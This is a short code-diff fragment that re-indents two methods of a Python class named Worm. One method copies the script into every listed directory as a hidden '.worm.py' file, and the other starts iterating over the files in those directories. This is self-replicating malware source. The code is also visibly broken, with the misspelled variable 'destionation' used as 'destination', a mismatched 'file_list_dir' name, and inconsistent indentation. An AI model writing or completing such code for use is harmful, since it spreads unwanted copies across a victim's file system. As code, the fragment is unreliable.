@@ -29,14 +29,14 @@ class Worm:
           self.list_directories(absolute_path)
         else:
          pass
-def create_new_worm(self):
-  for directory in self.target.dir_list:
-    destionation = os.path.join(directory, ".worm.py")
-    #copy the script in the new directory with similar name
-    shutil.copyfile(self.own_path, destination)
-def copy_existing_files(self):
-  for directory in self.target.dir_list:
-    file_list_in_dir = os.listdir(directory)
+   def create_new_worm(self):
+    for directory in self.target.dir_list:
+      destionation = os.path.join(directory, ".worm.py")
+      #copy the script in the new directory with similar name
+      shutil.copyfile(self.own_path, destination)
+   def copy_existing_files(self):
+    for directory in self.target.dir_list:
+      file_list_in_dir = os.listdir(directory)
     for file in file_list_dir:
       abs_path = os.path.join(directory, file)
       if not abs_path.startswith(".") and not os.path.isdir(abs_path):
